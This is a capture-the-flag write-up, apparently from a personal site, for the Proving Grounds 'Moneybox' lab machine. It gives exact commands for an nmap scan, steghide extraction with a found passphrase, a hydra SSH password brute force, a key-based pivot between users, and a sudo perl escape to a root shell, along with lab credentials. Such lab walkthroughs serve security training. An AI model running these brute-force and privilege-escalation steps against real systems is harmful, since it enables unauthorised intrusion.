---
layout: default
title: Moneybox
parent: Proving Grounds - Linux
nav_order: 5
---

# Moneybox

---

## Discovered Ports for Enumeration

- _21_ - FTP
- _22_ - SSH
- _80_ - HTTP

## Users and Credentials

- _Users_: renu, lily
- _Credentials_: renu:987654321

# Scanning (Nmap)

---

```bash
sudo nmap -Pn -p- -sC -sV -T4 -vv --open 192.168.162.230
```

# Enumeration

---

## 21 - FTP

Anonymous logon allowed.

Discovered _trytofind.jpg_ and downloaded locally.

![ftp](../../../assets/images/ctfs/proving_grounds/moneybox/ftp.png)

Located the following strings within _trytofind.jpg_

```bash
strings -n 20 trytofind.jpg
456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
```

## 80 - HTTP

### wfuzz

Found _/blogs_ directory.
Contains secret directory in HTML source code.

![secret](../../../assets/images/ctfs/proving_grounds/moneybox/secret.png)

Found a secret key in the _/S3cr3t-T3xt_ directory source code

![secret2](../../../assets/images/ctfs/proving_grounds/moneybox/secret2.png)

### Steghide

Use _steghide_ to extract file from _trytofind.jpg_ by passing in the discovered secret passphrase _3xtr4ctd4t4_

```bash
steghide extract -sf trytofind.jpg --passphrase 3xtr4ctd4t4
```

![steghide](../../../assets/images/ctfs/proving_grounds/moneybox/steghide.png)

We now have the user _renu_

# Exploitation

---

## Hydra

Use _hydra_ to crack the password for _renu_ on SSH

```bash
hydra -l renu -P '/usr/share/wordlists/rockyou.txt' 192.168.162.230 ssh
```

![hydra](../../../assets/images/ctfs/proving_grounds/moneybox/hydra.png)

SSH to target with credentials _renu:987654321_

# Post-Exploitation

---

## Enumerate Users

Locate the user _lily_ and _.ssh_ directory with an authorized key that can be used to pivot to _lily_

```bash
cd /home/lily/.ssh
ssh lily@127.0.0.1
```

![lily](../../../assets/images/ctfs/proving_grounds/moneybox/lily.png)

## Sudo permissions

We have sudo privileges for _/usr/bin/perl_

![sudo](../../../assets/images/ctfs/proving_grounds/moneybox/sudo.png)

![gtfobins](../../../assets/images/ctfs/proving_grounds/moneybox/gtfobins.png)

Run _perl_ to execute /bin/bash and elevate to a root shell.

```bash
sudo perl -e 'exec "/bin/bash";'
```

![root](../../../assets/images/ctfs/proving_grounds/moneybox/root.png)
